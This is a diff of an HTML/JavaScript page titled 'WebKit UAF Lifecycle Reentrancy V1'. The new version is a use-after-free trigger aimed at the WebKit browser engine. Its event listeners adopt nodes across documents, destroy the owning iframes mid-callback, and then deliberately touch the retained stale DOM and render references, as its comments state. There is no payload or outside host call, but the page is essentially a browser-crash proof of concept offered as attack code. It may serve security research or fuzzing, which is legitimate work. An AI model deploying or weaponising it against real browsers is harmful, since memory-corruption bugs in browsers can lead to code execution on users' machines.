@@ -1,452 +1,450 @@
-<!DOCTYPE html><html>
+
+<!DOCTYPE html>
+<html>
 <head>
 <meta charset="UTF-8">
-<title>Lifecycle Test</title><style>
-html, body {
-    margin: 0;
-    padding: 0;
-    width: 100%;
-    height: 100%;
-}
+<title>WebKit UAF Lifecycle Reentrancy V1</title>
 
-#root {
-    width: 100%;
-    height: 100%;
+<style>
+/* RenderTree / style-state pressure, kept moderate */
+#stage {
+    position: relative;
+    width: 420px;
+    min-height: 180px;
+    overflow: auto;
     contain: layout;
 }
 
-.container {
-    width: 95%;
-    height: 45%;
-    margin: 1%;
-    overflow: auto;
-    border: 1px solid transparent;
-}
-
-.frame {
-    width: 90%;
-    height: 80px;
-    border: 0;
-}
-
-.stress {
+.branch {
+    position: relative;
     display: block;
-    width: 1px;
-    height: 1px;
+    overflow: hidden;
+    transform: translateZ(0);
+    contain: layout paint;
 }
-</style></head><body><div id="root"><div id="containerA" class="container">
 
-    <iframe
-        id="frameA"
-        class="frame"
-        src="about:blank">
-    </iframe>
+.branch:nth-child(odd) {
+    writing-mode: horizontal-tb;
+    direction: ltr;
+}
 
-    <div id="innerA">
-        <div id="a1">
-            <div id="a2">
-                <div id="a3">
-                    <span id="a4">A</span>
-                </div>
-            </div>
-        </div>
+.branch:nth-child(even) {
+    writing-mode: horizontal-tb;
+    direction: rtl;
+}
+
+.probe {
+    display: block;
+    position: relative;
+    min-height: 18px;
+    margin: 2px;
+    padding: 2px;
+    overflow: hidden;
+}
+
+.focusable:focus {
+    outline: 1px solid;
+}
+
+@media (min-width: 1px) {
+    .probe { text-overflow: ellipsis; }
+}
+</style>
+</head>
+
+<body>
+<div id="stage">
+    <div class="branch" id="branchA">
+        <div class="probe" id="probeA" tabindex="0">A</div>
+        <div class="probe">A1</div>
+        <div class="probe">A2</div>
     </div>
 
-</div>
-
-
-<div id="containerB" class="container">
-
-    <iframe
-        id="frameB"
-        class="frame"
-        src="about:blank">
-    </iframe>
-
-    <div id="innerB">
-        <div id="b1">
-            <div id="b2">
-                <div id="b3">
-                    <span id="b4">B</span>
-                </div>
-            </div>
-        </div>
+    <div class="branch" id="branchB">
+        <div class="probe" id="probeB" tabindex="0">B</div>
+        <div class="probe">B1</div>
+        <div class="probe">B2</div>
     </div>
-
 </div>
 
-</div><script>
+<iframe id="frameA" name="frameA"
+        style="width:320px;height:110px;border:0"
+        srcdoc='<!doctype html>
+<html>
+<head>
+<style>
+html,body{margin:0;padding:0}
+#root{
+    position:relative;
+    overflow:auto;
+    contain:layout;
+    width:280px;
+    height:90px;
+}
+.item{
+    position:relative;
+    display:block;
+    min-height:14px;
+    margin:1px;
+    padding:2px;
+    transform:translateZ(0);
+}
+.item:nth-child(odd){direction:ltr}
+.item:nth-child(even){direction:rtl}
+</style>
+</head>
+<body>
+<div id="root">
+    <div class="item" id="item0" tabindex="0">frame A 0</div>
+    <div class="item" id="item1">frame A 1</div>
+    <div class="item" id="item2">frame A 2</div>
+    <div class="item" id="item3">frame A 3</div>
+</div>
+</body>
+</html>'>
+</iframe>
 
+<iframe id="frameB" name="frameB"
+        style="width:320px;height:110px;border:0"
+        srcdoc='<!doctype html>
+<html>
+<head>
+<style>
+html,body{margin:0;padding:0}
+#root{
+    position:relative;
+    overflow:auto;
+    contain:layout;
+    width:280px;
+    height:90px;
+}
+.item{
+    position:relative;
+    display:block;
+    min-height:14px;
+    margin:1px;
+    padding:2px;
+    transform:translateZ(0);
+}
+.item:nth-child(odd){direction:ltr}
+.item:nth-child(even){direction:rtl}
+</style>
+</head>
+<body>
+<div id="root">
+    <div class="item" id="item0" tabindex="0">frame B 0</div>
+    <div class="item" id="item1">frame B 1</div>
+    <div class="item" id="item2">frame B 2</div>
+    <div class="item" id="item3">frame B 3</div>
+</div>
+</body>
+</html>'>
+</iframe>
+
+<script>
 (function () {
-
-    var root = document.getElementById("root");
-    var containerA = document.getElementById("containerA");
-    var containerB = document.getElementById("containerB");
+    "use strict";
 
     var frameA = document.getElementById("frameA");
     var frameB = document.getElementById("frameB");
+    var branchA = document.getElementById("branchA");
+    var branchB = document.getElementById("branchB");
+    var probeA = document.getElementById("probeA");
+    var probeB = document.getElementById("probeB");
 
-    var innerA = document.getElementById("innerA");
-    var innerB = document.getElementById("innerB");
+    /*
+     * The important pattern here is not generic stress:
+     *
+     *   callback begins
+     *      -> cross-document mutation/adoption
+     *      -> owner/iframe destruction
+     *      -> style/layout invalidation
+     *      -> callback resumes
+     *
+     * This intentionally keeps GC out of the hot path.
+     */
 
-    var phase = 0;
-
-
-    function mark(value) {
+    function forceLayout(doc, node) {
         try {
-            localStorage.setItem(
-                "webkit_lifecycle_last_phase",
-                value
-            );
-        } catch (e) {
-        }
+            if (node)
+                void node.offsetHeight;
+            if (doc && doc.body)
+                void doc.body.offsetWidth;
+        } catch (_) {}
     }
 
-
-    function forceLayout() {
-        try {
-            void document.body.offsetHeight;
-            void root.offsetHeight;
-            void containerA.offsetHeight;
-            void containerB.offsetHeight;
-        } catch (e) {
-        }
-    }
-
-
-    function buildFrameA() {
-
-        try {
-
-            var d = frameA.contentDocument;
-
-            d.open();
-
-            d.write(
-                '<!DOCTYPE html>' +
-                '<html>' +
-                '<head>' +
-                '<meta charset="UTF-8">' +
-                '<style>' +
-                'html,body{margin:0;padding:0;height:100%;}' +
-                '#box{height:200px;width:200px;overflow:auto;}' +
-                '#inner{height:1000px;width:1000px;}' +
-                '</style>' +            '</head>' +
-            '<body>' +
-            '<div id="box">' +
-            '<div id="inner">' +
-            '<a id="navigation" href="about:blank">NAVIGATE</a>' +
-            '</div>' +
-            '</div>' +
-            '</body>' +
-            '</html>'
-        );
-
-        d.close();
-
-    } catch (e) {
-    }
-}
-
-
-function buildFrameB() {
-
-    try {
-
-        var d = frameB.contentDocument;
-
-        d.open();
-
-        d.write(
-            '<!DOCTYPE html>' +
-            '<html>' +
-            '<head>' +
-            '<meta charset="UTF-8">' +
-            '<style>' +
-            'html,body{margin:0;padding:0;}' +
-            '#outer{height:500px;width:500px;}' +
-            '#x{height:300px;width:300px;}' +
-            '</style>' +
-            '</head>' +
-            '<body>' +
-            '<div id="outer">' +
-            '<div id="x">' +
-            '<div id="y">' +
-            '<span id="z">B</span>' +
-            '</div>' +
-            '</div>' +
-            '</div>' +
-            '</body>' +
-            '</html>'
-        );
-
-        d.close();
-
-    } catch (e) {
-    }
-}
-
-
-function navigateFrameA() {
-
-    mark("03-navigation-start");
-
-    try {
-
-        var d = frameA.contentDocument;
-        var link = d.getElementById("navigation");
-
-        if (link)
-            link.click();
-        else
-            frameA.src = "about:blank";
-
-    } catch (e) {
-
-        try {
-            frameA.src = "about:blank";
-        } catch (ignore) {
-        }
-    }
-}
-
-
-function mutateParentBeforeDetach() {
-
-    mark("04-parent-mutation");
-
-    try {
-
-        var replacement = document.createElement("div");
-
-        replacement.id = "replacement";
-
-        replacement.style.width = "50%";
-        replacement.style.height = "50px";
-        replacement.style.overflow = "hidden";
-
-        for (var i = 0; i < 16; i++) {
-
-            var n = document.createElement("div");
-
-            n.style.width = (100 + i) + "px";
-            n.style.height = (10 + i) + "px";
-
-            replacement.appendChild(n);
-        }
-
-        containerA.appendChild(replacement);
-
-    } catch (e) {
-    }
-
-    forceLayout();
-}
-
-
-function detachFrameA() {
-
-    mark("05-detach-frameA");
-
-    try {
-
-        var oldFrame = frameA;
-
-        containerA.removeChild(oldFrame);
-
+    function moderateGCPressure() {
         /*
-         * Keep references alive while the renderer/document
-         * hierarchy is being detached.
+         * Small allocation burst only. This is deliberately much lighter
+         * than repeatedly running a full LayoutTest gc() helper.
          */
-        window.__oldFrame = oldFrame;
-        window.__oldFrameDocument = oldFrame.contentDocument;
-
-    } catch (e) {
+        var a = [];
+        for (var i = 0; i < 180; ++i)
+            a.push({x: i, s: "webkit-uaf-" + i});
+        a.length = 0;
     }
-}
 
+    function armFrame(frame, branch, probe) {
+        var win, doc, root, item, staleRoot, staleItem;
+        try {
+            win = frame.contentWindow;
+            doc = frame.contentDocument;
+            if (!doc || !doc.body)
+                return;
 
-function mutateFrameB() {
+            root = doc.getElementById("root");
+            item = doc.getElementById("item0");
+            staleRoot = root;
+            staleItem = item;
 
-    mark("06-frameB-mutation");
+            forceLayout(doc, root);
 
-    try {
+            /*
+             * EventTarget-style reentrancy:
+             * dispatching a custom event enters user callback, where the
+             * callback mutates ownership of a node and then destroys the
+             * iframe that owns the remaining state.
+             */
+            root.addEventListener("uafprobe", function firstListener() {
+                try {
+                    if (item && branch)
+                        branch.appendChild(item);
 
-        var d = frameB.contentDocument;
+                    if (probe) {
+                        probe.classList.toggle("focusable");
+                        probe.setAttribute("data-state", "changed");
+                    }
 
-        var x = d.getElementById("x");
-        var y = d.getElementById("y");
+                    forceLayout(document, branch);
 
-        if (x) {
-            x.style.width = "1px";
-            x.style.height = "1px";
-            x.style.overflow = "scroll";
-        }
+                    /*
+                     * Destroy the document owner after adoption/mutation.
+                     */
+                    frame.remove();
 
-        if (y) {
-            y.textContent = "";
-            y.appendChild(d.createElement("div"));
-        }
+                    /*
+                     * The callback deliberately retains old references and
+                     * touches them after owner destruction.
+                     */
+                    forceLayout(doc, staleRoot);
 
-        void d.body.offsetHeight;
+                    if (staleItem) {
+                        staleItem.classList.toggle("after-destroy");
+                        staleItem.textContent = "retained";
+                    }
+                } catch (_) {}
+            }, false);
 
-    } catch (e) {
+            /*
+             * Second listener creates propagation/reentrancy pressure:
+             * the first listener has already changed the tree and ownership.
+             */
+            root.addEventListener("uafprobe", function secondListener() {
+                try {
+                    if (staleRoot)
+                        forceLayout(doc, staleRoot);
+
+                    if (staleItem)
+                        staleItem.getBoundingClientRect();
+
+                    moderateGCPressure();
+                } catch (_) {}
+            }, false);
+
+            /*
+             * SVG/resource-like dependency analogue:
+             * stylesheet state is changed while the document is in transition.
+             */
+            if (doc.head) {
+                var style = doc.createElement("style");
+                style.textContent =
+                    ".late{display:block;position:relative;overflow:hidden;" +
+                    "transform:translateZ(0);contain:layout}" +
+                    ".late:first-child{direction:rtl}";
+                doc.head.appendChild(style);
+
+                forceLayout(doc, root);
+
+                setTimeout(function () {
+                    try {
+                        style.remove();
+
+                        if (staleRoot) {
+                            staleRoot.className = "late";
+                            forceLayout(doc, staleRoot);
+                        }
+                    } catch (_) {}
+                }, 0);
+            }
+
+            /*
+             * Dispatch only after all listeners and lifecycle state are ready.
+             */
+            setTimeout(function () {
+                try {
+                    if (staleRoot)
+                        staleRoot.dispatchEvent(new Event("uafprobe", {
+                            bubbles: true,
+                            cancelable: true
+                        }));
+                } catch (_) {}
+            }, 0);
+
+        } catch (_) {}
     }
-}
 
+    /*
+     * Cross-document adoption variant.
+     * A node originating in frame A is adopted into the top document while
+     * frame A is simultaneously entering destruction.
+     */
+    function crossDocumentAdoption() {
+        var docA, rootA, itemA, holder;
 
-function detachContainerB() {
+        try {
+            docA = frameA.contentDocument;
+            if (!docA)
+                return;
 
-    mark("07-detach-containerB");
+            rootA = docA.getElementById("root");
+            itemA = docA.getElementById("item1");
 
-    try {
+            if (!rootA || !itemA)
+                return;
 
-        var oldContainer = containerB;
+            holder = document.createElement("div");
+            holder.className = "branch";
+            document.getElementById("stage").appendChild(holder);
 
-        root.removeChild(oldContainer);
+            forceLayout(docA, rootA);
 
-        window.__oldContainer = oldContainer;
-        window.__oldFrameB = frameB;
-        window.__oldFrameBDocument = frameB.contentDocument;
+            rootA.addEventListener("adoptprobe", function () {
+                try {
+                    holder.appendChild(document.adoptNode(itemA));
 
-    } catch (e) {
+                    branchB.classList.toggle("probe-state");
+                    forceLayout(document, holder);
+
+                    frameA.remove();
+
+                    /*
+                     * Retained references survive the owner transition.
+                     */
+                    itemA.classList.toggle("retained");
+                    holder.offsetHeight;
+                    forceLayout(docA, rootA);
+                } catch (_) {}
+            }, false);
+
+            setTimeout(function () {
+                try {
+                    rootA.dispatchEvent(new Event("adoptprobe"));
+                } catch (_) {}
+            }, 5);
+
+        } catch (_) {}
     }
-}
 
+    /*
+     * RenderTree/style reentrancy variant:
+     * mutation starts while a frame callback is active, then the frame is
+     * detached and the callback resumes against retained render state.
+     */
+    function renderTreeReentry() {
+        var docB, rootB, itemB, styleB;
 
-function reinsertAndDestroy() {
+        try {
+            docB = frameB.contentDocument;
+            if (!docB)
+                return;
 
-    mark("08-reinsert-destroy");
+            rootB = docB.getElementById("root");
+            itemB = docB.getElementById("item2");
 
-    try {
+            styleB = docB.createElement("style");
+            styleB.textContent =
+                "#root{column-count:1;column-gap:3px}" +
+                ".reentry{position:relative;overflow:hidden;" +
+                "writing-mode:horizontal-tb;transform:translateZ(0)}";
+            docB.head.appendChild(styleB);
 
-        root.appendChild(containerB);
+            forceLayout(docB, rootB);
 
-        void root.offsetHeight;
+            rootB.addEventListener("styleprobe", function () {
+                try {
+                    itemB.className = "item reentry";
+                    rootB.style.display = "block";
+                    forceLayout(docB, rootB);
 
-        root.removeChild(containerB);
+                    styleB.remove();
 
-    } catch (e) {
+                    /*
+                     * Remove the owner after render/style invalidation.
+                     */
+                    frameB.remove();
+
+                    /*
+                     * Resume with retained references.
+                     */
+                    rootB.style.position = "relative";
+                    itemB.getBoundingClientRect();
+                    forceLayout(docB, rootB);
+                } catch (_) {}
+            }, false);
+
+            setTimeout(function () {
+                try {
+                    rootB.dispatchEvent(new Event("styleprobe"));
+                } catch (_) {}
+            }, 10);
+
+        } catch (_) {}
     }
-}
 
+    /*
+     * Fullscreen is intentionally not used as the primary trigger here.
+     * Focus is also secondary. The core is iframe lifecycle + reentrancy.
+     */
+    function start() {
+        try {
+            forceLayout(document, document.getElementById("stage"));
+            armFrame(frameA, branchA, probeA);
+            armFrame(frameB, branchB, probeB);
 
-function postDetachAccess() {
+            setTimeout(crossDocumentAdoption, 25);
+            setTimeout(renderTreeReentry, 40);
 
-    mark("09-post-detach");
+            /*
+             * One light lifecycle mutation in the top document.
+             */
+            setTimeout(function () {
+                try {
+                    branchA.classList.toggle("layout-state");
+                    void branchA.offsetHeight;
 
-    try {
+                    var moved = document.createElement("div");
+                    moved.className = "probe";
+                    moved.textContent = "lifecycle";
+                    branchA.appendChild(moved);
 
-        var oldFrame = window.__oldFrame;
-        var oldDocument = window.__oldFrameDocument;
+                    void moved.offsetHeight;
 
-        if (oldFrame) {
-            oldFrame.src = "about:blank";
-        }
+                    branchA.removeChild(moved);
+                    branchB.appendChild(moved);
 
-        if (oldDocument && oldDocument.body) {
-            oldDocument.body.innerHTML = "";
-        }
+                    void moved.offsetHeight;
+                } catch (_) {}
+            }, 70);
 
-    } catch (e) {
+        } catch (_) {}
     }
-}
 
-
-function finalMutation() {
-
-    mark("10-final-mutation");
-
-    try {
-
-        root.innerHTML = "";
-
-        var d1 = document.createElement("div");
-        var d2 = document.createElement("div");
-
-        d1.style.display = "contents";
-        d2.style.display = "block";
-
-        d1.appendChild(d2);
-        root.appendChild(d1);
-
-        void root.offsetHeight;
-
-        d1.remove();
-
-    } catch (e) {
-    }
-}
-
-
-function run() {
-
-    mark("01-start");
-
-    buildFrameA();
-    buildFrameB();
-
-    forceLayout();
-
-    mark("02-frames-ready");
-
-
-    setTimeout(function () {
-
-        navigateFrameA();
-
-        setTimeout(function () {
-
-            mutateParentBeforeDetach();
-
-            requestAnimationFrame(function () {
-
-                detachFrameA();
-
-                requestAnimationFrame(function () {
-
-                    mutateFrameB();
-
-                    requestAnimationFrame(function () {
-
-                        detachContainerB();
-
-                        requestAnimationFrame(function () {
-
-                            reinsertAndDestroy();
-
-                            requestAnimationFrame(function () {
-
-                                postDetachAccess();
-
-                                requestAnimationFrame(function () {
-
-                                    finalMutation();
-
-                                    mark("11-complete");
-
-                                });
-
-                            });
-
-                        });
-
-                    });
-
-                });
-
-            });
-
-        }, 20);
-
-    }, 20);
-
-}
-
-
-window.addEventListener("load", run);
+    if (document.readyState === "loading")
+        window.addEventListener("load", start, { once: true });
+    else
+        start();
 
 })();
-
-</script></body>
+</script>
+</body>
 </html>
